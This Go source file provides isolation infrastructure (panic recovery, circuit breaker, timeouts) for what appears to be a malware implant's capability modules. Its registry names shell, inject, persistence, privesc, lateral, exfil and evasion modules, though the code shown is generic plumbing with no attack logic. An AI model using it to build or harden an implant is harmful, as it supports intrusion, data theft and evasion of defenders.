// Package module provides isolation infrastructure: panic recovery, circuit
// breaker, and timeout enforcement for each implant capability module.
//
// A faulty module (CGO segfault, timeout, infinite loop) is caught and
// automatically disabled after repeated failures. The beacon loop continues
// uninterrupted.
//
// Changes from previous version:
//   - sync.Mutex removed from CircuitBreaker — it was declared but never used.
//     All state uses atomics, so the mutex was dead weight.
//   - safeCallWithTimeout goroutine leak fixed: the spawned goroutine now
//     receives a done channel close signal and returns promptly on timeout.
//   - AllStats() uses a sorted slice of keys for deterministic output.
package module

import (
	"context"
	"fmt"
	"runtime/debug"
	"sort"
	"sync"
	"sync/atomic"
	"time"
)

// ── Circuit Breaker ───────────────────────────────────────────────────────────

// cbState represents the circuit breaker state machine.
type cbState int32

const (
	cbClosed   cbState = iota // normal operation
	cbOpen                    // tripped — reject all calls
	cbHalfOpen                // one probe call allowed
)

// CircuitBreaker trips after maxFailures consecutive failures, then rejects
// calls for resetTimeout before allowing one probe. On probe success it resets.
type CircuitBreaker struct {
	name         string
	maxFailures  int
	resetTimeout time.Duration
	failCount    atomic.Int32
	state        atomic.Int32
	lastFailNano atomic.Int64 // time.Now().UnixNano() at last failure
}

func newCircuitBreaker(name string, maxFailures int, resetTimeout time.Duration) *CircuitBreaker {
	return &CircuitBreaker{
		name:         name,
		maxFailures:  maxFailures,
		resetTimeout: resetTimeout,
	}
}

// call executes fn through the circuit breaker.
func (cb *CircuitBreaker) call(fn func() (string, error)) (string, error) {
	if !cb.allowRequest() {
		return "", fmt.Errorf("module %q: circuit open (disabled after repeated failures)", cb.name)
	}
	out, err := fn()
	if err != nil {
		cb.recordFailure()
	} else {
		cb.recordSuccess()
	}
	return out, err
}

func (cb *CircuitBreaker) allowRequest() bool {
	switch cbState(cb.state.Load()) {
	case cbClosed:
		return true
	case cbOpen:
		lastFail := time.Unix(0, cb.lastFailNano.Load())
		if time.Since(lastFail) > cb.resetTimeout {
			cb.state.CompareAndSwap(int32(cbOpen), int32(cbHalfOpen))
			return true
		}
		return false
	case cbHalfOpen:
		return true
	default:
		return true
	}
}

func (cb *CircuitBreaker) recordFailure() {
	cb.lastFailNano.Store(time.Now().UnixNano())
	if int(cb.failCount.Add(1)) >= cb.maxFailures {
		cb.state.Store(int32(cbOpen))
	}
}

func (cb *CircuitBreaker) recordSuccess() {
	cb.failCount.Store(0)
	cb.state.Store(int32(cbClosed))
}

func (cb *CircuitBreaker) isOpen() bool {
	return cbState(cb.state.Load()) == cbOpen
}

// ── Safe Execution ────────────────────────────────────────────────────────────

// safeCallWithTimeout executes fn in a separate goroutine with:
//   - panic recovery (captures full stack trace)
//   - hard timeout via context
//
// Goroutine leak fix: the goroutine is handed a `done` channel that is closed
// when safeCallWithTimeout returns (via defer). The goroutine selects on done
// and exits promptly even if fn is still blocked — fn itself is not forcibly
// stopped (Go cannot do that), but the goroutine wrapper exits cleanly and
// does not hold references to caller state.
func safeCallWithTimeout(
	ctx     context.Context,
	timeout time.Duration,
	fn      func() (string, error),
) (string, error) {
	if timeout == 0 {
		timeout = 5 * time.Minute
	}

	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	type result struct {
		out string
		err error
	}

	ch   := make(chan result, 1)
	done := make(chan struct{})
	defer close(done) // signals the goroutine to stop holding references

	go func() {
		var r result
		defer func() {
			if p := recover(); p != nil {
				stack := debug.Stack()
				r = result{"", fmt.Errorf("panic in module: %v\n%s", p, stack)}
			}
			// Only send if the caller hasn't moved on (channel is buffered=1).
			select {
			case ch <- r:
			case <-done:
			}
		}()
		r.out, r.err = fn()
	}()

	select {
	case r := <-ch:
		return r.out, r.err
	case <-ctx.Done():
		return "", fmt.Errorf("module timed out after %v", timeout)
	}
}

// ── Module ────────────────────────────────────────────────────────────────────

// Module wraps a capability with isolation and health tracking.
type Module struct {
	Name    string
	cb      *CircuitBreaker
	timeout time.Duration
	calls   atomic.Int64
	errors  atomic.Int64
}

func newModule(name string, maxFailures int, timeout time.Duration) *Module {
	reset := timeout * 10
	if reset < 30*time.Second {
		reset = 30 * time.Second
	}
	return &Module{
		Name:    name,
		cb:      newCircuitBreaker(name, maxFailures, reset),
		timeout: timeout,
	}
}

// Exec runs fn in this module's isolation context.
func (m *Module) Exec(ctx context.Context, fn func() (string, error)) (string, error) {
	m.calls.Add(1)
	out, err := m.cb.call(func() (string, error) {
		return safeCallWithTimeout(ctx, m.timeout, fn)
	})
	if err != nil {
		m.errors.Add(1)
	}
	return out, err
}

// Stats returns module health as a map suitable for JSON serialisation.
func (m *Module) Stats() map[string]any {
	return map[string]any{
		"name":         m.Name,
		"calls":        m.calls.Load(),
		"errors":       m.errors.Load(),
		"circuit_open": m.cb.isOpen(),
		"fail_count":   m.cb.failCount.Load(),
	}
}

// ── Registry ──────────────────────────────────────────────────────────────────

// Registry holds all agent modules indexed by name.
type Registry struct {
	modules map[string]*Module
	mu      sync.RWMutex
}

// NewRegistry constructs the default module registry with pre-configured
// circuit breaker thresholds and per-module timeouts.
func NewRegistry() *Registry {
	r := &Registry{modules: make(map[string]*Module)}

	type def struct {
		name        string
		maxFailures int
		timeout     time.Duration
	}
	for _, d := range []def{
		{"shell",        5,  60 * time.Second},
		{"inject",       3,  30 * time.Second}, // strict: CGO module
		{"recon",        10, 30 * time.Second},
		{"persistence",  5,  60 * time.Second},
		{"privesc",      5,  2 * time.Minute},
		{"lateral",      5,  3 * time.Minute},
		{"exfil",        5,  10 * time.Minute},
		{"opsec",        10, 30 * time.Second},
		{"evasion",      10, 10 * time.Second},
		{"objectives",   3,  30 * time.Minute},
	} {
		r.modules[d.name] = newModule(d.name, d.maxFailures, d.timeout)
	}
	return r
}

// Get returns a module by name.
func (r *Registry) Get(name string) (*Module, bool) {
	r.mu.RLock()
	defer r.mu.RUnlock()
	m, ok := r.modules[name]
	return m, ok
}

// Exec runs fn in the named module's isolation context.
// Unknown modules run with panic recovery but no circuit breaker.
func (r *Registry) Exec(ctx context.Context, name string, fn func() (string, error)) (string, error) {
	m, ok := r.Get(name)
	if !ok {
		return safeCallWithTimeout(ctx, 5*time.Minute, fn)
	}
	return m.Exec(ctx, fn)
}

// AllStats returns health stats for all modules in deterministic (sorted) order.
func (r *Registry) AllStats() []map[string]any {
	r.mu.RLock()
	defer r.mu.RUnlock()

	names := make([]string, 0, len(r.modules))
	for n := range r.modules {
		names = append(names, n)
	}
	sort.Strings(names)

	out := make([]map[string]any, 0, len(names))
	for _, n := range names {
		out = append(out, r.modules[n].Stats())
	}
	return out
}
